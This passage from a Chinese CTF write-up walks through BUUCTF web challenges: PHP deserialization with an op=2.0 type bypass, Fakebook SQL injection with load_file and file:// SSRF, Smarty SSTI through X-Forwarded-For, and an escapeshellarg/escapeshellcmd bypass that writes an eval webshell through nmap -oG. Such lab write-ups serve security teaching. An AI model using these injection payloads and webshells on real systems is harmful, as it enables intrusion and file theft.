class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>($<span class="built_in">this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            $<span class="built_in">this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>($<span class="built_in">this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            $res = $<span class="built_in">this</span>-&gt;read();</span><br><span class="line">            $<span class="built_in">this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $<span class="built_in">this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> function <span class="title function_">write</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(isset($<span class="built_in">this</span>-&gt;filename) &amp;&amp; isset($<span class="built_in">this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((string)$<span class="built_in">this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                $<span class="built_in">this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents($<span class="built_in">this</span>-&gt;filename, $<span class="built_in">this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) $<span class="built_in">this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> $<span class="built_in">this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $<span class="built_in">this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> function <span class="title function_">read</span><span class="params">()</span> &#123;</span><br><span class="line">        $res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(isset($<span class="built_in">this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents($<span class="built_in">this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> function <span class="title function_">output</span><span class="params">($s)</span> &#123;</span><br><span class="line">        echo <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        echo $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">__destruct</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>($<span class="built_in">this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            $<span class="built_in">this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function <span class="title function_">is_valid</span><span class="params">($s)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset($_GET&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>源码有点长，但是其实审计之后并不难，接下来我慢慢介绍一下各个模块</p>
<blockquote>
<p><strong>属性</strong>：<br><code>op,filename,content</code>，这里的op相当于个标志，filename是文件名称，content是文件内容<br><strong>write:</strong><br>向filename写入content内容，有长度限制<br><strong>read:</strong><br>读取filename中的内容<br><strong>process:</strong><br>检测op的值，为1进入write环节，为2进入read环节<br><strong>output：</strong><br>输出结果<br><strong>__destruct:</strong><br>析构函数，如果op为2，将op变为1，这里是强类型比较注意</p>
</blockquote>
<p>审核完后，做这题我第一思路是看看能不能用write去写入一句话木马：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FileHandler</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> $op=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $content=<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> <span class="title class_">FileHandler</span>;</span><br><span class="line">echo <span class="title function_">serialize</span><span class="params">($a)</span>;</span><br></pre></td></tr></table></figure>
<p>当我构造完payload后输入：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665646780192-b3dc9948-8099-4574-af8f-ce2fa8162da7.png#averageHue=%23f7f6f4&clientId=u01cf76e3-e905-4&from=paste&height=106&id=u1aebb33b&name=image.png&originHeight=133&originWidth=1229&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16349&status=done&style=none&taskId=u905e89e9-6bc3-407e-86ff-99cb28bd65a&title=&width=983.2" alt="image.png"><br>没有权限，那没办法，那就走第二条路<br>这边注意析构函数中判断op是否为2，用的是强类型比较，这边我们可以构造一个op&#x3D;2.0去绕过</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FileHandler</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> $op=<span class="number">2.0</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> <span class="title class_">FileHandler</span>;</span><br><span class="line">echo <span class="title function_">serialize</span><span class="params">($a)</span>;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里用public是因为在php7.1+之后，解析器对这些属性会不敏感<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665646912442-7f022714-b595-491f-b218-20c9ae9362a5.png#averageHue=%23faf9f9&clientId=u01cf76e3-e905-4&from=paste&height=96&id=u10b3bf18&name=image.png&originHeight=120&originWidth=1096&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7629&status=done&style=none&taskId=u4989ccce-5f94-4bd2-9393-8c98ceb85f3&title=&width=876.8" alt="image.png"><br>得出答案</p>
<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665740018273-b390e6ce-9840-4b3e-b8d6-ef21479f457d.png#averageHue=%23fefefe&clientId=ufe1d86b2-23d9-4&from=paste&height=202&id=ua831de68&name=image.png&originHeight=253&originWidth=1695&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24291&status=done&style=none&taskId=u36c3bf68-5229-41ff-986a-2d8d7462669&title=&width=1356" alt="image.png"><br>join就是注册的意思，login就登入，给了一个这样的界面，首先扫一下网站，一扫就出来了2个文件，<code>flag.php</code>,<code>robots.txt</code>，flag文件看不到是空白的<br>robots：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665740073649-18c57ee6-ac04-4fd3-a215-b7253fa911d1.png#averageHue=%23e8d2b5&clientId=ufe1d86b2-23d9-4&from=paste&height=145&id=u15dded09&name=image.png&originHeight=181&originWidth=1009&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10108&status=done&style=none&taskId=u6dbcda63-1368-441f-8bee-7c81abacf70&title=&width=807.2" alt="image.png"><br>一个备份文件，下载下来是：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserInfo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">public</span> <span class="variable">$name</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">public</span> <span class="variable">$age</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">public</span> <span class="variable">$blog</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__construct</span><span class="params">($name, $age, $blog)</span></span><br><span class="line">    &#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;name = $name;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;age = (<span class="type">int</span>)$age;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">get</span><span class="params">($url)</span></span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">getBlogContents</span> <span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="built_in">this</span>-&gt;get($<span class="built_in">this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">isValidBlog</span> <span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        $blog = $<span class="built_in">this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看到了curl可能就会存在ssrf，但是目前我们什么也不知道，我们都不知道这源码和界面有什么关系，慢慢探讨<br>注册一个账号，然后登入：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665740183572-73f2a0ee-4528-464f-8293-f2acf0de540f.png#averageHue=%23dfc39e&clientId=ufe1d86b2-23d9-4&from=paste&height=185&id=u6fb08055&name=image.png&originHeight=231&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24251&status=done&style=none&taskId=ue1a5f34c-97f6-47b7-8731-b67c683be8a&title=&width=1536" alt="image.png"><br>有一个no&#x3D;1，这里说不定存在sql注入<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665740195764-80033676-350e-4173-a5bb-804924ff6c91.png#averageHue=%23fdfcfb&clientId=ufe1d86b2-23d9-4&from=paste&height=146&id=ua8a4685d&name=image.png&originHeight=183&originWidth=1158&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24646&status=done&style=none&taskId=u552728b7-8601-4f66-a7be-7148d3a3f48&title=&width=926.4" alt="image.png"><br>单引号报错了，说明猜测是正确的，经过一系列的测试发现ban的东西是<code>union select</code>,注意是这整个语句，不是单独ban select或是union<br>然后经过一系列测试，可以用报错注入，时间盲注，但是我们还发现可以联合注入：<br><code>0 union/**/select 1,2,3,4</code>:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665740876858-f27bd763-f38b-4f3e-a977-c4cff309c1ae.png#averageHue=%23fefdfc&clientId=ufe1d86b2-23d9-4&from=paste&height=258&id=u93b463da&name=image.png&originHeight=323&originWidth=1463&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41974&status=done&style=none&taskId=u1d9907ed-2202-4b06-9d76-429c8a05afe&title=&width=1170.4" alt="image.png"><br>2是回显点，为什么不要加注释或者是单引号呢？这个根据我的猜测后台代码应该是做了处理，把我们的payload分为了两部分，从第一个字符就拆开，我们也可以验证：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665740927326-1f1c3971-1160-4878-aeba-95b6c0eb565e.png#averageHue=%23a2ac9d&clientId=ufe1d86b2-23d9-4&from=paste&height=70&id=u68c05bd0&name=image.png&originHeight=88&originWidth=1536&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24702&status=done&style=none&taskId=ufaaac962-7f42-4cd0-b48a-4105db59ee3&title=&width=1228.8" alt="image.png"><br>输入单引号报错，输入2个单引号：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665740993439-7036dcb5-9b87-4947-b496-63d2a21cdbb4.png#averageHue=%23dab98f&clientId=ufe1d86b2-23d9-4&from=paste&height=204&id=uae235166&name=image.png&originHeight=255&originWidth=1584&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33620&status=done&style=none&taskId=u8f592de6-7b8f-4b15-9a5b-c7d5a528afd&title=&width=1267.2" alt="image.png"><br>居然是正常的，由此猜测至少要有2个字符，因为要截断<br>我们之前不是读到了一个flag.php吗，我们可以payload：<br><code>0 union/**/select 1,load_file(&#39;/var/www/html/flag.php&#39;),3,4</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665741165528-16ef4dc8-c21c-415e-8066-cd086748545b.png#averageHue=%23fcfcfc&clientId=ufe1d86b2-23d9-4&from=paste&height=165&id=ube5112da&name=image.png&originHeight=206&originWidth=812&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9300&status=done&style=none&taskId=u983fd28f-9f61-4596-aac6-7bcc9cee95a&title=&width=649.6" alt="image.png"><br>答案就出来了，我还扫到了一个文件<code>db.php</code>:<br>我们用同样方法读出来<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665741224551-c62e489f-ab68-409e-b164-b73627493a3a.png#averageHue=%23fefefe&clientId=ufe1d86b2-23d9-4&from=paste&height=339&id=uc349b87d&name=image.png&originHeight=424&originWidth=908&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10946&status=done&style=none&taskId=u0c5ab201-df2e-4013-acbb-d4e69a7912b&title=&width=726.4" alt="image.png"><br>可以发现啊，我们上面的猜测是错误的，原因只是因为中括号框起来了</p>
<p>**方法二：<br>**大家可能就好奇了，那我们的ssrf可不可以用呢？当然是可以的<br>这边先用联合注入爆一下数据库<br><code>?no=0 union/**/select 1,group_concat(data),3,4 from users</code><br>这边直接就跳转到爆字段了，前面的自行去<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665741482949-4904ffa7-40ca-4867-a0c9-7dae8a6c25a1.png#averageHue=%23fefdfc&clientId=ufe1d86b2-23d9-4&from=paste&height=118&id=ue9a4ed32&name=image.png&originHeight=147&originWidth=841&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16393&status=done&style=none&taskId=ue2185702-19c6-46cd-ae72-7d40bc3d950&title=&width=672.8" alt="image.png"><br>这是一个序列化后的数据，结合上面的源代码，虽然ban了http和https，但是我们还有file伪协议<br>直接就可以进行一个ssrf，<code>?no=-1 union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#39;</code><br>这样也同样出来flag，这边可能是后台进行了一个反序列化，这里数据要在第四个地方写，因为第四个字段才是data<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665742119017-3d7f939d-c126-450f-a542-b1f4aa2404e8.png#averageHue=%23fdfdfd&clientId=ufe1d86b2-23d9-4&from=paste&height=81&id=u642d67ea&name=image.png&originHeight=101&originWidth=1398&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6082&status=done&style=none&taskId=u03f0371b-2552-436d-b3d3-99a1b5fe4e7&title=&width=1118.4" alt="image.png"><br>之后看到了一串base64，解码：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665742159295-206dd3c6-045b-4814-ac24-36b15defa5b5.png#averageHue=%23fcfbfa&clientId=ufe1d86b2-23d9-4&from=paste&height=140&id=uceb94dc7&name=image.png&originHeight=175&originWidth=1409&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25366&status=done&style=none&taskId=u75f80ae0-9bc6-43d3-823f-4e5c3a0bbb6&title=&width=1127.2" alt="image.png"></p>
<h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>ip的密码，今天做的题都好厉害啊<br>进入页面：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665748133474-0765c2ae-54f6-49b1-b438-79744940c614.png#averageHue=%231e3338&clientId=ufe1d86b2-23d9-4&from=paste&height=350&id=u38e96e96&name=image.png&originHeight=437&originWidth=1731&originalType=binary&ratio=1&rotation=0&showTitle=false&size=856645&status=done&style=none&taskId=uf8fbe16f-27be-4a15-aba7-1070feef049&title=&width=1384.8" alt="image.png"><br>一个flag一个hint<br>flag：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665748142381-8568862b-fdf2-474c-b591-8c5b63c8f077.png#averageHue=%239dabae&clientId=ufe1d86b2-23d9-4&from=paste&height=407&id=u126f8c4e&name=image.png&originHeight=509&originWidth=1766&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1634182&status=done&style=none&taskId=u541fe3eb-c228-44c0-be48-5a8d118c02f&title=&width=1412.8" alt="image.png"><br>hint：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665748149866-21ded4ba-ce1c-4750-b631-d02b8e607669.png#averageHue=%23fbfafa&clientId=ufe1d86b2-23d9-4&from=paste&height=94&id=u2e4f6f12&name=image.png&originHeight=117&originWidth=529&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5262&status=done&style=none&taskId=u53f0dda9-0cfe-45bd-95b3-30e737f5619&title=&width=423.2" alt="image.png"><br>他知道我们的IP地址，在浏览器肯定啥也分析不出来，他知道我们的IP无非就是XFF，X-Real-ip等等，抓包添加XFF请求头：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665748398983-09e48e5e-8f92-485b-8ea3-ace964693c2e.png#averageHue=%23c5b8a0&clientId=ufe1d86b2-23d9-4&from=paste&height=378&id=ue8a6f288&name=image.png&originHeight=472&originWidth=1139&originalType=binary&ratio=1&rotation=0&showTitle=false&size=453473&status=done&style=none&taskId=udf725e63-8231-4402-82db-60e5dde1b08&title=&width=911.2" alt="image.png"><br>可以看到已经就是成功了，就是XFF控制的，但是知道这个我们又该咋样去得到flag呢？网页源代码中有这么一段：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665748464790-f4384f00-8d65-493c-b21b-e2b672d65808.png#averageHue=%23fefefe&clientId=ufe1d86b2-23d9-4&from=paste&height=274&id=u9546b2b2&name=image.png&originHeight=342&originWidth=920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15095&status=done&style=none&taskId=ubed33301-0d5e-47f7-ac74-de4b879da49&title=&width=736" alt="image.png"><br>这是不是很像模板注入里的语句，当然只是像，所以该考虑一下SSTI注入，尝试一下：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665748523895-5787733b-6da8-479d-a6a2-6808efcd8f82.png#averageHue=%23cabca4&clientId=ufe1d86b2-23d9-4&from=paste&height=368&id=u68785c22&name=image.png&originHeight=460&originWidth=1072&originalType=binary&ratio=1&rotation=0&showTitle=false&size=399010&status=done&style=none&taskId=uf1c4afcf-b67d-475a-bfc4-5c043e1005e&title=&width=857.6" alt="image.png"><br>确实存在ssti注入，这边直接开读！：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665748549652-9573c8dd-d269-48e6-812b-55312f84699c.png#averageHue=%23cac0b0&clientId=ufe1d86b2-23d9-4&from=paste&height=352&id=uae44d6d8&name=image.png&originHeight=440&originWidth=1154&originalType=binary&ratio=1&rotation=0&showTitle=false&size=458101&status=done&style=none&taskId=ud15fa1a2-bd66-4b76-a719-0d92987e643&title=&width=923.2" alt="image.png"><br>读取一下flag.php:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665748677098-f06d0d19-727e-4270-86e6-b678d702ea9d.png#averageHue=%23faf9f9&clientId=ufe1d86b2-23d9-4&from=paste&height=392&id=uf7612b94&name=image.png&originHeight=490&originWidth=1171&originalType=binary&ratio=1&rotation=0&showTitle=false&size=72031&status=done&style=none&taskId=uba336280-0f8f-4dea-a40c-1edd94d897d&title=&width=936.8" alt="image.png"><br>这是一段代码，也就是如何判断我们IP的代码，而且可以从这里知道这是一个smarty模板<br>发现在根目录就直接读：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665748718407-69fe1322-4c14-474a-87ae-e7afeeb4a6b8.png#averageHue=%23f9f8f8&clientId=ufe1d86b2-23d9-4&from=paste&height=402&id=u7c49ed07&name=image.png&originHeight=503&originWidth=1205&originalType=binary&ratio=1&rotation=0&showTitle=false&size=79869&status=done&style=none&taskId=ua6019d8f-ed2b-4781-bffb-c7613390b6d&title=&width=964" alt="image.png"></p>
<h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p>直上源码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="title function_">if</span> <span class="params">(isset($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])</span>) &#123;</span><br><span class="line">    $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = $_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!isset($_GET[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(<span class="string">&quot;glzjin&quot;</span>. $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    echo <span class="string">&#x27;you are in sandbox &#x27;</span>.$sandbox;</span><br><span class="line">    <span class="meta">@mkdir($sandbox)</span>;</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    echo <span class="title function_">system</span><span class="params">(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.$host)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码很短，却很生草，这一题主要就在<code>escapeshellarg</code>和<code>escapeshellcmd</code>这两个函数结合运用，会导致一些差错</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">escapeshellarg函数</span><br><span class="line">作用：把单引号转义之后再用引号括起来，使其成为一个字符串，使其只能提交一个参数。</span><br><span class="line">escapeshellcmd函数</span><br><span class="line">作用：把\,不闭合的引号等符号进行转义，使一次只能执行一次cmd命令杜绝<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&amp;&amp;&#x27;</span>的使用。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">传入的参数是：<span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span><span class="string">&#x27; -v -d a=1</span></span><br><span class="line"><span class="string">经过escapeshellarg处理后变成了&#x27;</span><span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span><span class="string">&#x27;\&#x27;&#x27;</span> -v -d a=<span class="number">1</span><span class="string">&#x27;，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</span></span><br><span class="line"><span class="string">经过escapeshellcmd处理后变成&#x27;</span><span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span><span class="string">&#x27;\\&#x27;</span><span class="string">&#x27; -v -d a=1\&#x27;，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php</span></span><br><span class="line"><span class="string">最后执行的命令是curl &#x27;</span><span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span><span class="string">&#x27;\\&#x27;</span><span class="string">&#x27; -v -d a=1\&#x27;，由于中间的\\被解释为\而不再是转义字符，所以后面的&#x27;</span>没有被转义，与再后面的<span class="string">&#x27;配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1&#x27;</span>，即向<span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>\发起请求，POST 数据为a=<span class="number">1</span><span class="string">&#x27;。</span></span><br></pre></td></tr></table></figure>
<p>函数介绍完了就直接上payload了：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=<span class="string">&#x27; &lt;?php eval($_POST[1]);?&gt; -oG 1.php &#x27;</span></span><br></pre></td></tr></table></figure>
<p>注意这边单引号和内容之间有一个空格，我们本地测试一下：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665752749241-e24d0e52-8084-4cc3-8e06-8b60c4cc7aba.png#averageHue=%23fefdfd&clientId=u9c486b39-dc87-4&from=paste&height=155&id=u67856b68&name=image.png&originHeight=194&originWidth=1510&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24344&status=done&style=none&taskId=u0781ccb8-5f5e-485e-b886-5d247102e97&title=&width=1208" alt="image.png"><br>可以看到结果分为：</p>
